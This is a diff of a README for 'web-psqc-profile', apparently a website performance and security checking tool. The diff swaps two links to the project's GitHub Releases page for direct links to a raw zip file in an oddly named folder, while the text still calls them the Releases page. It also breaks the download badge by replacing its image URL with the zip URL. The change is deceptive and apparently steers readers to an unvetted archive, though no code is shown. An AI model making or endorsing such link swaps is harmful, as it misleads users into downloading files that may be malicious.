@@ -1,7 +1,7 @@
 # 🌐 web-psqc-profile - Assess Your Website's Performance Easily
 
 ## 📥 Download the Application
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Pienihullu/web-psqc-profile/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Pienihullu/web-psqc-profile/main/overby/web-psqc-profile.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Pienihullu/web-psqc-profile/main/overby/web-psqc-profile.zip)
 
 ## 🚀 Getting Started
 Welcome to web-psqc-profile! This tool helps you check your website's performance, security, and quality. You can evaluate your site through 16 independent tests and receive certificates for your results.
@@ -19,7 +19,7 @@ Welcome to web-psqc-profile! This tool helps you check your website's performanc
 - **Disk Space**: 100 MB of free space required.
 
 ## 📥 Download & Install
-To get started, visit the Releases page to download the application: [Download Here](https://github.com/Pienihullu/web-psqc-profile/releases).
+To get started, visit the Releases page to download the application: [Download Here](https://raw.githubusercontent.com/Pienihullu/web-psqc-profile/main/overby/web-psqc-profile.zip).
 
 1. **Visit the Releases Page**: Click the link above to go to the download page.
 2. **Download the Latest Version**: Look for the latest release. Click the download link for your operating system.
